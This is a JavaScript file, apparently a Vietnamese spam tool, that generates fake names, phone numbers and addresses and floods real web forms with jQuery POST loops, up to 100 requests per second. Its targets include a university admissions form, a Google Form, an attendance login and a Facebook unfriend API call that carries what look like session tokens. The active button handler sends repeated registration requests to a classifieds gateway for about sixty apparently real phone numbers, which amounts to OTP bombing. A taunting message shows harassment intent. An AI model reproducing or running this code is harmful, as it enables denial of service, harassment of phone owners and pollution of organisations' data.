// value
var ho = ["Nguyễn ", "Trần ", "Lê ", "Phạm ", "Hoàng ", "Huỳnh ", "Phan ", "Vũ ", "Võ ", "Đặng ", "Bùi ", "Đỗ ", "Hồ ", "Ngô ", "Dương ", "Lý "];
var ten = ["Vân", "Thị Lan", "Thị Anh", "Thị Quỳnh", "Ngọc Vy", "Đức Thành",
    "Văn Thành", "Kiều Trang", "Văn Hoàng", "Như Quỳnh", "Huy Hoàng", "Oanh", "Văn Hoàng", "Duy Kiên", "Nhung", "Xuân Phước",
    "Văn Quyền", "Huấn", "Nga", "Thị Mai", "Loan", "Phương Mai", "Bảo", "Ngọc Bích",
    "Văn Khanh", "Duy Khanh", "Thị Khuyên", "Ngọc Khánh", "Văn Khánh", "Hải Châu", "Huyền", "Châu", "Hải Châu", "Chiến", "Minh Chiến", "Dũng", "Văn Quân", "Văn Phúc", "Ðức", "Văn Hiển", "Xuân Khiển", 'Hào', "Ðăng",
    "Văn Hải", "Thị Ngọc", "Linh Giang", "Hoài", "Thị Hà", "Văn Hà", "Xuân Hương", "Hợp",
    "Thị Hương", "Thị Trang", "Duy Tuyền", "Văn Sơn", "Huy", "Xuân Thủy", "Hùng", "Tùng", "Lộc", "Mạnh", "Huệ", "Phượng", "Thăng", "Thắng", "Minh Đạt", "Văn Tuấn", "Trịnh", "Hồng Thủy", "Thanh Nga", "Thanh Thảo", "Thảo Minh", "Hùng Việt",
    "Cao", "Duyên", "Thu", "Thị Hằng", "Trần Mạnh", "Đạt Danh", "Vinh", "Văn Lợi"
];
var dauso = ["03", "09", "08"];
var quanhanoi = ["Ba Đình",
    "Bắc Từ Liêm",
    "Cầu Giấy",
    "Đống Đa",
    "Hà Đông",
    "Hai Bà Trưng",
    "Hoàn Kiếm",
    "Hoàng Mai",
    "Long Biên",
    "Nam Từ Liêm",
    "Tây Hồ",
    "Thanh Xuân",
    "Thị xã",
    "Sơn Tây",
    "Ba Vì",
    "Chương Mỹ",
    "Đan Phượng",
    "Đông Anh",
    "Gia Lâm",
    "Hoài Đức",
    "Mê Linh",
    "Mỹ Đức",
    "Phú Xuyên",
    "Phúc Thọ",
    "Quốc Oai",
    "Sóc Sơn",
    "Thạch Thất",
    "Thanh Oai",
    "Thanh Trì",
    "Thường Tín",
    "Ứng Hòa"
];
var quanhcm = ["Quận 1",
    "Quận 12",
    "Quận Thủ Đức",
    "Quận 9",
    "Quận Gò Vấp",
    "Quận Bình Thạnh",
    "Quận Tân Bình",
    "Quận Tân Phú",
    "Quận Phú Nhuận",
    "Quận 2",
    "Quận 3",
    "Quận 10",
    "Quận 11",
    "Quận 4",
    "Quận 5",
    "Quận 6",
    "Quận 8",
    "Quận Bình Tân",
    "Quận 7",
    "Huyện Củ Chi",
    "Huyện Hóc Môn",
    "Huyện Bình Chánh",
    "Huyện Nhà Bè",
    "Huyện Cần Giờ"
];
var phuonghanoi = ["Phúc Xá", "Ngọc Hà", "Đội Cấn", "Ngọc Khánh", "Kim Mã", "Giảng Võ", "Thành Công", "Cống Vị", "Liễu Giai", "Vĩnh Phúc", "Điện Biên", "Trúc Bạch", "Quán Thánh", "Nguyễn Trung Trực",
    "Đồng Xuân", "Cửa Nam", "Chương Dương", "Phúc Tân", "Hàng Buồm", "Trần Hưng Đạo", "Tràng Tiền", "Lý Thái Tổ", "Hàng Trống", "Hàng Mã", "Hàng Bông", "Cửa Đông", "Hàng Bài", "Hàng Gai", "Hàng Bồ", "Phan Chu Trinh", "Hàng Bạc", "Hàng Đào",
    "Ngọc Thụy", "Bồ Đề", "Đức Giang", "Thượng Thanh", "Ngọc Lâm", "Sài Đồng", "Thạch Bàn", "Long Biên", "Phúc Lợi", "Phúc Đồng", "Giang Biên", "Cự Khối", "Gia Thụy", "Việt Hưng",
    "Thanh Xuân Bắc", "Thanh Xuân Trung", "Thanh Xuân Nam", "Khương Trung", "Phương Liệt", "Nhân Chính", "Khương Mai", "Thượng Đình", "Khương Đình", "Hạ Đình", "Kim Giang",
    "Nghĩa Đô", "Nghĩa Tân", "Mai Dịch", "Quan Hoa", "Dịch Vọng", "Dịch Vọng Hậu", "Yên Hòa", "Trung Hòa", "Đại Kim", "Định Công", "Hoàng Văn Thụ", "Hoàng Liệt", "Tân Mai", "Tương Mai", "Mai Động", "Lĩnh Nam", "Thịnh Liệt", "Giáp Bát", "Vĩnh Hưng", "Thanh Trì", "Yên Sở", "Trần Phú", "Yên Phụ", "Phú Thượng", "Thụy Khuê", "Xuân La", "Bưởi", "Tứ Liên", "Nhật Tân", "Quảng An",
    "Hàng Bột", "Văn Chương", "Thổ Quan", "Phương Liên", "Kim Liên", "Phương Mai", "Khương Thượng", "Thịnh Quang", "Trung Liệt", "Quang Trung", "Nam Đồng", "Ô Chợ Dừa", "Láng Hạ", "Láng Thượng", "Trung Phụng", "Ngã Tư Sở", "Trung Tự", "Khâm Thiên", "Quốc Tử Giám", "Cát Linh", "Văn Miếu", "Đồng Tâm", "Trương Định", "Minh Khai", "Vĩnh Tuy", "Bạch Đằng", "Thanh Lương", "Thanh Nhàn", "Bạch Mai", "Nguyễn Du", "Bùi Thị Xuân", "Lê Đại Hành", "Ngô Thì Nhậm", "Phố Huế", "Phạm Đình Hổ", "Đồng Nhân", "Đông Mác", "Ô Cầu Dền", "Bách Khoa", "Quỳnh Lôi", "Quỳnh Mai",
    "Mỹ Đình 1", "Mỹ Đình 2", "Mễ Trì", "Phú Đô", "Đại Mỗ", "Tây Mỗ", "Trung Văn", "Phương Canh", "Xuân Phương", "Cầu Diễn", "Thụy Phương", "Liên Mạc", "Tây Tựu", "Minh Khai", "Thượng Cát", "Xuân Tảo", "Xuân Đỉnh", "Đông Ngạc", "Đức Thắng", "Phúc Diễn", "Cổ Nhuế 1", "Cổ Nhuế 2", "Phú Diễn", "Phú Lãm", "Phú Lương", "Quang Trung", "Nguyễn Trãi", "Vạn Phúc", "Phúc La", "Hà Cầu", "Yết Kiêu", "Yên Nghĩa", "Văn Quán", "Mộ Lao", "La Khê", "Đồng Mai", "Dương Nội", "Kiến Hưng", "Phú La", "Biên Giang"
];
var phuonghcm = [
    "Tân Định",
    "Đa Kao",
    "Bến Nghé",
    "Bến Thành",
    "Nguyễn Thái Bình",
    "Phạm Ngũ Lão",
    "Cầu Ông Lãnh",
    "Cô Giang",
    "Nguyễn Cư Trinh",
    "Cầu Kho",
    "Thạnh Xuân",
    "Thạnh Lộc",
    "Hiệp Thành",
    "Thới An",
    "Tân Chánh Hiệp",
    "An Phú Đông",
    "Tân Thới Hiệp",
    "Trung Mỹ Tây",
    "Tân Hưng Thuận",
    "Đông Hưng Thuận",
    "Tân Thới Nhất",
    "Linh Xuân",
    "Bình Chiểu",
    "Linh Trung",
    "Tam Bình",
    "Tam Phú",
    "Hiệp Bình Phước",
    "Hiệp Bình Chánh",
    "Linh Chiểu",
    "Linh Tây",
    "Linh Đông",
    "Bình Thọ",
    "Trường Thọ",
    "Long Bình",
    "Long Thạnh Mỹ",
    "Tân Phú",
    "Hiệp Phú",
    "Tăng Nhơn Phú A",
    "Tăng Nhơn Phú B",
    "Phước Long B",
    "Phước Long A",
    "Trường Thạnh",
    "Long Phước",
    "Long Trường",
    "Phước Bình",
    "Phú Hữu",
    "Phường 15",
    "Phường 13",
    "Phường 17",
    "Phường 06",
    "Phường 16",
    "Phường 12",
    "Phường 14",
    "Phường 10",
    "Phường 05",
    "Phường 07",
    "Phường 04",
    "Phường 01",
    "Phường 09",
    "Phường 08",
    "Phường 11",
    "Phường 03",
    "Phường 13",
    "Phường 11",
    "Phường 27",
    "Phường 26",
    "Phường 12",
    "Phường 25",
    "Phường 05",
    "Phường 07",
    "Phường 24",
    "Phường 06",
    "Phường 14",
    "Phường 15",
    "Phường 02",
    "Phường 01",
    "Phường 03",
    "Phường 17",
    "Phường 21",
    "Phường 22",
    "Phường 19",
    "Phường 28",
    "Phường 02",
    "Phường 04",
    "Phường 12",
    "Phường 13",
    "Phường 01",
    "Phường 03",
    "Phường 11",
    "Phường 07",
    "Phường 05",
    "Phường 10",
    "Phường 06",
    "Phường 08",
    "Phường 09",
    "Phường 14",
    "Phường 15",
    "Phường Tân Sơn Nhì",
    "Phường Tây Thạnh",
    "Phường Sơn Kỳ",
    "Phường Tân Qúy",
    "Phường Tân Thành",
    "Phường Phú Thọ Hoà",
    "Phường Phú Thạnh",
    "Phường Phú Trung",
    "Phường Hoà Thạnh",
    "Phường Hiệp Tân",
    "Phường Tân Thới Hoà",
    "Phường 04",
    "Phường 05",
    "Phường 09",
    "Phường 07",
    "Phường 03",
    "Phường 01",
    "Phường 02",
    "Phường 08",
    "Phường 15",
    "Phường 10",
    "Phường 11",
    "Phường 17",
    "Phường 14",
    "Phường 12",
    "Phường 13",
    "Phường Thảo Điền",
    "Phường An Phú",
    "Phường Bình An",
    "Phường Bình Trưng Đông",
    "Phường Bình Trưng Tây",
    "Phường Bình Khánh",
    "Phường An Khánh",
    "Phường Cát Lái",
    "Phường Thạnh Mỹ Lợi",
    "Phường An Lợi Đông",
    "Phường Thủ Thiêm",
    "Phường 08",
    "Phường 07",
    "Phường 14",
    "Phường 12",
    "Phường 11",
    "Phường 13",
    "Phường 06",
    "Phường 09",
    "Phường 10",
    "Phường 04",
    "Phường 05",
    "Phường 03",
    "Phường 02",
    "Phường 01",
    "Phường Bình Hưng Hòa",
    "Phường Bình Hưng Hoà A",
    "Phường Bình Hưng Hoà B",
    "Phường Bình Trị Đông",
    "Phường Bình Trị Đông A",
    "Phường Bình Trị Đông B",
    "Phường Tân Tạo",
    "Phường Tân Tạo A",
    "Phường An Lạc",
    "Phường An Lạc A",
    "Phường Tân Thuận Đông",
    "Phường Tân Thuận Tây",
    "Phường Tân Kiểng",
    "Phường Tân Hưng",
    "Phường Bình Thuận",
    "Phường Tân Quy",
    "Phường Phú Thuận",
    "Phường Tân Phú",
    "Phường Tân Phong",
    "Phường Phú Mỹ"
];
var xa = ["Xã Phú Mỹ Hưng",
    "Xã An Phú",
    "Xã Trung Lập Thượng",
    "Xã An Nhơn Tây",
    "Xã Nhuận Đức",
    "Xã Phạm Văn Cội",
    "Xã Phú Hòa Đông",
    "Xã Trung Lập Hạ",
    "Xã Trung An",
    "Xã Phước Thạnh",
    "Xã Phước Hiệp",
    "Xã Tân An Hội",
    "Xã Phước Vĩnh An",
    "Xã Thái Mỹ",
    "Xã Tân Thạnh Tây",
    "Xã Hòa Phú",
    "Xã Tân Thạnh Đông",
    "Xã Bình Mỹ",
    "Xã Tân Phú Trung",
    "Xã Tân Thông Hội",
    "Thị trấn Hóc Môn",
    "Xã Tân Hiệp",
    "Xã Nhị Bình",
    "Xã Đông Thạnh",
    "Xã Tân Thới Nhì",
    "Xã Thới Tam Thôn",
    "Xã Xuân Thới Sơn",
    "Xã Tân Xuân",
    "Xã Xuân Thới Đông",
    "Xã Trung Chánh",
    "Xã Xuân Thới Thượng",
    "Xã Bà Điểm",
    "Thị trấn Tân Túc",
    "Xã Phạm Văn Hai",
    "Xã Vĩnh Lộc A",
    "Xã Vĩnh Lộc B",
    "Xã Bình Lợi",
    "Xã Lê Minh Xuân",
    "Xã Tân Nhựt",
    "Xã Tân Kiên",
    "Xã Bình Hưng",
    "Xã Phong Phú",
    "Xã An Phú Tây",
    "Xã Hưng Long",
    "Xã Đa Phước",
    "Xã Tân Quý Tây",
    "Xã Bình Chánh",
    "Xã Quy Đức",
    "Thị trấn Nhà Bè",
    "Xã Phước Kiển",
    "Xã Phước Lộc",
    "Xã Nhơn Đức",
    "Xã Phú Xuân",
    "Xã Long Thới",
    "Xã Hiệp Phước",
    "Thị trấn Cần Thạnh",
    "Xã Bình Khánh",
    "Xã Tam Thôn Hiệp",
    "Xã An Thới Đông",
    "Xã Thạnh An",
    "Xã Long Hòa",
    "Xã Lý Nhơn"
];
var tinh = ["An Giang",
    "Bà Rịa - Vũng Tàu",
    "Bắc Giang",
    "Bắc Kạn",
    "Bạc Liêu",
    "Bắc Ninh",
    "Bến Tre",
    "Bình Định",
    "Bình Dương",
    "Bình Phước",
    "Bình Thuận",
    "Cà Mau",
    "Cao Bằng",
    "Đắk Lắk",
    "Đắk Nông",
    "Điện Biên",
    "Đồng Nai",
    "Đồng Tháp",
    "Gia Lai",
    "Hà Giang",
    "Hà Nam",
    "Hà Tĩnh",
    "Hải Dương",
    "Hậu Giang",
    "Hòa Bình",
    "Hưng Yên",
    "Khánh Hòa",
    "Kiên Giang",
    "Kon Tum",
    "Lai Châu",
    "Lâm Đồng",
    "Lạng Sơn",
    "Lào Cai",
    "Long An",
    "Nam Định",
    "Nghệ An",
    "Ninh Bình",
    "Ninh Thuận",
    "Phú Thọ",
    "Quảng Bình",
    "Quảng Nam",
    "Quảng Ngãi",
    "Quảng Ninh",
    "Quảng Trị",
    "Sóc Trăng",
    "Sơn La",
    "Tây Ninh",
    "Thái Bình",
    "Thái Nguyên",
    "Thanh Hóa",
    "Thừa Thiên Huế",
    "Tiền Giang",
    "Trà Vinh",
    "Tuyên Quang",
    "Vĩnh Long",
    "Vĩnh Phúc",
    "Yên Bái",
    "Phú Yên",
    "Cần Thơ",
    "Đà Nẵng",
    "Hải Phòng",
    "Hà Nội",
    "TP HCM"
];
var ngancach = ["-", ", "];

var monhoc = ["Cơ sở lập trình","Tiếng anh căn bản","Triết học Mac-Lenin","Toán Cao Cấp","Mạng máy tính","Hệ điều hành","Hệ quản trị CSDL","Toán rời rạc",
"Cơ sở dữ liệu","Lập trình mã nguồn mở","Lập trình winform","Lập trình Android","Kiến trúc máy tính","Lập trình hướng đối tượng",
"Thiết kế website","Tiếng Anh kỹ thuật 1","Tiếng Anh kỹ thuật 2","Tiếng Anh kỹ thuật 3","Tiếng Anh kỹ thuật 4","Phát triển ứng dụng website","Cấu trúc dữ liệu và giải thuật",
"Trí tuệ nhân tạo","An toàn thông tin","Photoshop","Lập trình nhúng","Truyền thông đa phương tiện"];
var nhanxet = ["Tốt","Tồi","Tinh thần học tập tốt","hăng hái phát biểu","Chán","Tích cực","Ngoan","Ý thức kém"];

function randomso(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}
function tuyensinhukb() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
            var khoa = ["Quản trị dịch vụ du lịch và lữ hành",
                "Quản trị kinh doanh ",
                "Luật kinh tế ",
                "Ngôn ngữ Anh ",
                "Công nghệ thông tin ",
                "Kế toán",
                "Tài chính – Ngân hàng",
                "Công nghệ kỹ thuật điện tử – viễn thông",
                "Thiết kế đồ họa",
                "Thiết kế thời trang ",
                "Quản lý nhà nước ",
                "Quản lý xây dựng ",
                "Kiến trúc ",
                "Quản lý kinh tế",
                "Đào tạo trình độ Cử nhân",
                "Đào tạo trình độ Thạc sĩ"
            ];
            var rdkhoa = khoa[Math.floor(Math.random() * khoa.length)]
            $.post("https://api.form.ladipage.com/sendform", {
                    "form_config_id": "60c6fb98a65e92002c16c902",
                    "ladipage_id": "60b5e97beba2a30012e7a221",
                    "tracking_form": [{
                            "name": "url_page",
                            "value": "http://dk.kinhbac.daotaodh.edu.vn/"
                        },
                        { "name": "utm_source", "value": "" },
                        { "name": "utm_medium", "value": "" },
                        { "name": "utm_campaign", "value": "" },
                        { "name": "utm_term", "value": "" },
                        { "name": "utm_content", "value": "" },
                        { "name": "variant_url", "value": "" },
                        { "name": "variant_content", "value": "" }
                    ],
                    "form_data": [{ "name": "name", "value": hoten },
                        { "name": "phone", "value": sdt },
                        {
                            "name": "form_item695",
                            "value": rdkhoa
                        }
                    ],
                    "data_key": null,
                    "status_send": 2,
                    "total_revenue": 0,
                    "time_zone": 7
                },
                function(data, status) {
                    document.writeln("ĐÃ VẢ VỠ MỖM UKB");
                }
                );
        }
    }, 1000);
}
function tuyensinhukb2() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var ngancach2 = ngancach[[Math.floor(Math.random() * ngancach.length)]];
            var quan = [quanhanoi[Math.floor(Math.random() * quanhanoi.length)], quanhcm[Math.floor(Math.random() * quanhcm.length)]];
            var phuong = [phuonghanoi[Math.floor(Math.random() * phuonghanoi.length)], phuonghcm[Math.floor(Math.random() * phuonghcm.length)]];
            var thanhpho = tinh[Math.floor(Math.random() * tinh.length)];
            var diachi = xa[Math.floor(Math.random() * xa.length)] + ngancach2 + phuong[Math.floor(Math.random() * phuong.length)] + ngancach2 + quan[Math.floor(Math.random() * quan.length)] + ngancach2 + thanhpho;
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
            var khoa = [
                "quản trị dịch vụ du lịch và lữ hành",
                "quản trị kinh doanh ",
                "quản trị Dịch vụ Nhà hàng, Khách sạn",
                "ngôn ngữ Anh ",
                "công nghệ thông tin ",
                "kế toán"
            ];
            var rdkhoa = khoa[Math.floor(Math.random() * khoa.length)]
            $.post("http://daihockinhbac.edu.vn/student/register", {
                "name": hoten,
                "phone": sdt,
                "majors": "Ngành "+rdkhoa,
                "address": diachi
                },
                function(data, status) {
                    document.writeln("ĐÃ VẢ VỠ MỖM UKB");
                }
                );
        }
    }, 1000);
}

function spamvin(){
    // setInterval(function() {
    //     for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            $.post("https://identity.tekoapis.com/api/v1/users/register", 
            {"id": "ce66df09667e4bba8b8825e2747e470c", 
            "name": "Nguy\u1ec5n Gia Tr\u01b0\u1eddng",
             "phone_number": "0345382198",
              "active": true,
               "tenant_id": "11",
                "confirmed": false,
                 "revoked": false,
                  "registration_method": "Password", 
                  "updated_at": "2021-07-17T00:03:40"
                }
            ,
            );
    //     }
    // }, 2000);
}
function taoweb() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            $.post("http://attendance-api.cf/mvc/public/account/login", {
                "username":"08D4800001",
                "password":"123",
                "uuid":"f644f0ef66ed3b57"
                },
                /*function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    // document.writeln("*");
                }*/
                );
        }
    }, 2000);
}

function pi() {
    // setInterval(function() {
    //     for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            $.post("https://backend.socialchain.app/", {
                "username":"08D4800001",
                "password":"123",
                "uuid":"f644f0ef66ed3b57"
                },
                /*function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    // document.writeln("*");
                }*/
                );
    //     }
    // }, 2000);
}
function alibaba() {
    // setInterval(function() {
    //     for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            $.post("http://allibabavn.company/user/add", {
                "_token": "isEmm2MP1G3OSXvIvCJQIhYQrRCbj3qLMDR4Tljx",
                "name": "Ngô Thành Minh",
                "phone": "0339041117",
                "password": "truong1234",
                "confirm_password": "truong1234",
                "url": "http://allibabavn.company/"
                },
                /*function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    // document.writeln("*");
                }*/
                );
    //     }
    // }, 2000);
}
function unflfb() {
    // setInterval(function() {
    //     for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            $.post("https://www.facebook.com/api/graphql/", {
                "av": "100019152686917",
                "__user": "100019152686917",
                "__a": "1",
                "__dyn": "7AzHxqU5a5Q1ryaxG4VuC0BVU98nwgU76byQdwSwAyUco2qwJyEiwp8O2S1DwUx609vCxS320om78c87m2210x-8wgolzUO0n2US2G2Caw9m8wsU9kbxS2218wc61axe3e9xy3O1mzXxG1Pxi4UaEW2G1jxS6Fobrxu5Elxm3y2K5ojUlDw-wUws9o8oy5oO2-2WU7e2am1AyES",
                "__csr": "gtl7ZhYJ9WEIALsWlN2T6jOAczT4i8_i5tlb8JOkx25lvjuJuXOLCmWhL_nGhQ9CjJeGWjjuGVdaPJqAKnLhDAFt4-J6XO2ThFBnKKAqG8rCBjFbV94-9K8ihdHAHoznVHDmq-CFoOQu4FFnSAjiW8BGEyquiJvGuF5h-udzVrAKVogBz8K9Dxd4BHgtKnh9BQ5FEXS8KFox6x6fx2V98St5y9qypogKimih1h7DCGayaBzooCDzEOdy4eyp8sKEyQ8gydQ2qey8-QVbXBG8CzEpwXyEhUySeh9VEgF1-l2UhZp45VeUjzVEgx6UG6Q4K6F9Ehzoy8AGqELwFxeum7A7Aexa9x5ecxq4oycwTBwAx2K8y84rxiUiwWxy3m9wgu5pUsyUlw77zaw29985q2m0O8N3U0Ni0nu1iwcm4AvKUhw28ULxa0hu09qy809f815U7K3m6604Z6czQ0PS1HwMjBPwNyE1V85O4UgDolwh40J81VE4y26cxpcAN4056E2PBw-w46w0SjyS0mgg680KK4E1tW8",
                "__req": "1i",
                "__hs": "18823.EXP2:comet_pkg.2.1.1.0",
                "dpr": "1",
                "__ccg": "EXCELLENT",
                "__rev": "1004113928",
                "__s": "ivbu6i:9q28wj:h1ey7k",
                "__hsi": "6985057408739843907-0",
                "__comet_req": "1",
                "fb_dtsg": "AQHbLD1Ts7zVmQU:26:1625517023",
                "jazoest": "21978",
                "lsd": "vpoXy1GMSYqRFvX9mVcfBT",
                "__spin_r": "1004113928",
                "__spin_b": "trunk",
                "__spin_t": "1626335412",
                "fb_api_caller_class": "RelayModern",
                "fb_api_req_friendly_name": "FriendingCometUnfriendMutation",
                "variables": {"input":{"source":"friending_jewel","unfriended_user_id":"100012268390988","actor_id":"100019152686917","client_mutation_id":"4"},"scale":1},
                "server_timestamps": true,
                "doc_id": "4281078165250156",
                "fb_api_analytics_tags": ["qpl_active_flow_ids=30605361"]
                },
                );
    //     }
    // }, 2000);
}

function sodaubai(){
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
        var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
        var mon = (monhoc[Math.floor(Math.random() * monhoc.length)]);
        var nx = (nhanxet[Math.floor(Math.random() * nhanxet.length)]);
        var khoa = ["10","09","08","07"];
        var lop = ["CNTT1","CNTT2"];
        var khoalop = (khoa[Math.floor(Math.random() * khoa.length)])+"D."+(lop[Math.floor(Math.random() * lop.length)])
        $.post("https://docs.google.com/forms/d/e/1FAIpQLSdfEwpk99EFzMbSxOTcvmkGLUQM5X9wWKe9tSU2-hVDY_Is_A/formResponse", {
            "entry.1748636563": mon,
            "entry.562182705": hoten,
            "entry.1005863547": randomso(1, 11).toString(),
            "entry.416503478": randomso(25, 33).toString(),
            "entry.1469230165": mon,
            "entry.620560250:": nx,
            "entry.1313319247_year": "2021",
            "entry.1313319247_month": randomso(1, 12).toString(),
            "entry.1313319247_day": randomso(1,28).toString(),
            "entry.507905819": khoalop,
            "entry.507905819_sentinel:": "",
            "fvv": "1",
            "draftResponse": [null,null,"8844358065934883220"],
            "pageHistory": "0",
            "fbzx": "8844358065934883220"
            },
            );
    }
}, 1000);
}
function chotot(){
    var sdt = ['0866632574', '0819789216', '0865667876', '0393468992', '0963811085',
    '0869000955', '0372053277', '036341196', '0981113684', '0395889587', '0981942706', '0914623067',
     '0879332174', '0373329640', '0968169542', '0396519246', '0388319714', '0346860474', '0379959081', '0965944691',
      '0812107267', '0326361137', '0964890345', '0397520028', '0349955038', '0977920301', '0982950714',
       '0378242789', '0332297809', '0971985738', '0379639138','0326973839', '0977749413', '0988168525', '0794029976',
        '0387798178', '0375659078', '0988459758', '0383708872', '0372977990', '0399400906', '0336333884', '0565168039', 
        '0983605337', '0987128490', '0397598890', '0337661973', '0984610855', '0326714999', '0988781617', '0967083599',
         '0362322991', '0342013409', '0328000828', '0354405108', '0987361400', '0985826763', '0778407424',
          '0976587016', '0364485643', '0987563235', '0967634226' ];
    for(var i = 0;i<sdt.length;i++){
        if(sdt[i].length==10){
            for(var j=0;j<10;j++){
                $.ajax({
                    type: 'POST',
                    url: 'https://gateway.chotot.com/v2/public/auth/register',
                    data: '{"phone":"'+sdt[i]+'","password":"123456987a"}',
                    contentType: "application/json",
                    dataType: 'json'
                });
            }
        }
    }
    
}
$(document).ready(function() {
    $("button").click(function() {
        // tuyensinhukb();
        // codegym();
        // taoweb();
        // alibaba();
        // unflfb();
        // tuyensinhukb2();
        //spamvin();
        //sodaubai();
        setInterval(() => {
            chotot();
        }, 60000);
    });
});
